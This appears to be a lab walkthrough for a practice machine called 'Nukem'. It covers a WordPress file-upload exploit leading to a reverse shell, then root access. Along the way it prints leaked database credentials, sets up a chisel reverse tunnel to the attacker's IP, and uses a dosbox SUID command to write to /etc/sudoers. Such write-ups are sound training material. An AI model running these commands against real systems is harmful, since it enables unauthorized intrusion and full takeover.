##### Tags: `SUID`  `vncviewer`  `wpscan`  `GTFOBin`  `chisel`  `local service`

# 🐧Nukem🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.135.105

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.3 (protocol 2.0)
80/tcp    open  http        Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
3306/tcp  open  mysql       MariaDB 10.3.24 or later (unauthorized)
5000/tcp  open  http        Werkzeug httpd 1.0.1 (Python 3.8.5)
13000/tcp open  http        nginx 1.18.0
36445/tcp open  netbios-ssn Samba smbd 4
```
Port 80 is running a wordpress  
use wpscan found there is a plugin vulnerable
```console
$ wpscan --url http://192.168.135.105 -e ap --plugins-detection aggressive --no-update 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.135.105/ [192.168.135.105]
[+] Started: Fri Feb 20 00:12:16 2026

[i] Plugin(s) Identified:

[+] simple-file-list
 | Location: http://192.168.135.105/wp-content/plugins/simple-file-list/
 | Last Updated: 2025-12-11T16:59:00.000Z
 | [!] The version is out of date, the latest version is 6.1.15
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 4.2.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.135.105/wp-content/plugins/simple-file-list/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.135.105/wp-content/plugins/simple-file-list/readme.txt
```
search and found WordPress Plugin Simple File List 4.2.2 - Arbitrary File Upload  
https://www.exploit-db.com/exploits/48979
```console
$ python3 exploit.py 192.168.135.105

[+] File renamed to reverse.png
[+] File uploaded at http://192.168.135.105/wp-content/uploads/simple-file-list/reverse.png
[+] File moved to http://192.168.135.105/wp-content/uploads/simple-file-list/reverse.php
[^-^] Exploit seems to have worked...
        URL: http://192.168.135.105/wp-content/uploads/simple-file-list/reverse.php
```
```console
$ nc -lvnp 80                     
listening on [any] 80 ...
connect to [192.168.45.213] from (UNKNOWN) [192.168.135.105] 51880

[http@nukem /]$ id
uid=33(http) gid=33(http) groups=33(http)
```
## Privilege Escalation
upload linpeas and found couple of vulnerability  

SUID bit
```console
-rwsr-xr-x 1 root root 2.5M Jul  7  2020 /usr/bin/dosbox
```
Wordpress Files with username and password
```console
-rw-r--r-- 1 http root 2913 Sep 18  2020 /srv/http/wp-config.php                                                                                                                         
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'commander' );
define( 'DB_PASSWORD', 'CommanderKeenVorticons1990' );
define( 'DB_HOST', 'localhost' );
```
port 5901 is running locally 
```console
[http@nukem ~]$ netstat -ano
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 127.0.0.1:5901          0.0.0.0:*               LISTEN      off (0.00/0/0)
```
su to commander
```console
[http@nukem /]$ su commander

[commander@nukem /]$ id
uid=1000(commander) gid=1000(commander) groups=1000(commander)     
```
found dosbox can run root on GTFOBin  
https://gtfobins.org/gtfobins/dosbox/  
run the exploit command and found the vncviewer terminal is not able to display  
so we run chisel locally
```console
Attacker machine

$ chisel server --p 5000 --reverse
2026/02/20 21:45:38 server: Reverse tunnelling enabled
2026/02/20 21:45:38 server: Fingerprint n00uYhjmO1MbcEB+pTC86pvJUhduwSfqkZWNKUe++VU=
2026/02/20 21:45:38 server: Listening on http://0.0.0.0:5000
2026/02/20 21:45:58 server: session#1: Client version (1.11.3) differs from server version (1.11.3-0kali1)
2026/02/20 21:45:58 server: session#1: tun: proxy#R:5901=>5901: Listening
```
```console
Target Machine

[commander@nukem tmp]$ ./chisel client 192.168.45.213:5000 R:5901:127.0.0.1:5901
2026/02/20 10:46:31 client: Connecting to ws://192.168.45.213:5000
2026/02/20 10:46:31 client: Connected (Latency 101.059106ms)
```
run vncviewer on our machine and the terminal will open
```console
$ vncviewer localhost:5901
Connected to RFB server, using protocol version 3.8
Performing standard VNC authentication
Password: 
Authentication successful
Desktop name "nukem:1 (commander)"
VNC server default format:
  32 bits per pixel.
```
put the command of dosbox  
add commander to sudo group
```console
[commander@nukem tmp]$ LFILE='/etc/sudoers'
[commander@nukem tmp]$ /usr/bin/dosbox -c 'mount c /' -c "echo commander ALL=(ALL) NOPASSWD: ALL >> c:$LFILE" -c exit
[commander@nukem tmp]$ sudo su

[root@nukem ~]# id
uid=0(root) gid=0(root) groups=0(root)
```
